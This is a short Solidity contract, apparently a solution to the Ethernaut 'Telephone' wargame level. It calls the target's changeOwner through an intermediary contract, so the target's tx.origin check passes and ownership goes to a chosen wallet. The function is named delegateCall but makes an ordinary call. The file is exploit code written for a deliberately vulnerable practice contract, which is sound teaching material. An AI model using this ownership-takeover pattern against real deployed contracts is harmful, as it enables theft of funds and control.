// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Exp {
    Telephone public tel;

    function delegateCall(address _contract, address _wallet) public {
        tel = Telephone(_contract);
        tel.changeOwner(_wallet);
    }
}